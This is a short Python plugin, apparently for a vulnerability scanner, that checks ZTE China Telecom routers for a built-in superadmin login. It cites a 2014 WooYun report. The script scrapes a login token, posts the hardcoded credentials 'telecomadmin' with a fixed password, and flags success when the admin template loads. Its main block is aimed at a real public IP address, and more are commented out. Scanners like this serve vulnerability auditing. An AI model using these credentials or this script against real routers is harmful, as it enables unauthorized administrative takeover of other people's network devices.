#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:wonderkun
#Name:电信路由器配置不当，存在超级管理员账号
#Refer:http://www.wooyun.org/bugs/wooyun-2014-049406
#Data:2015/12/19

import re  
import urlparse

def assign(service, arg):
    if service == "zte":
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    #get the Frm_Logintoken
    code1,head1,res1,errcode1,finalurl1=curl.curl2(arg)
    partten=re.compile('document\.getElementById\("Frm_Logintoken"\).value = "(\d{5,8})";')
    match=partten.search(res1)
    Frm_Logintoken=""
    if match:
        Frm_Logintoken=match.group(1)
    url1=arg+"getpage.gch?pid=1001&logout=1"
    data="Username=telecomadmin&Password=nE7jA%255m&Frm_Logintoken="+Frm_Logintoken
    #proxy=('127.0.0.1',8080)
    code,head,res,errcode,finalurl=curl.curl2(arg,post=data)
    if code==200 and  "src=\"template.gch\"" in res: 
        security_hole("电信路由器配置不当，存在超级管理员账号登陆"+arg)

if __name__ == '__main__' :
    from  dummy import *  
    #audit(assign('www','http://222.245.193.34/')[1])
    #audit(assign('www','http://222.247.245.50/')[1])    
    audit(assign('zte','http://222.218.18.247/')[1])
    #audit(assign('www','http://222.247.73.227/')[1])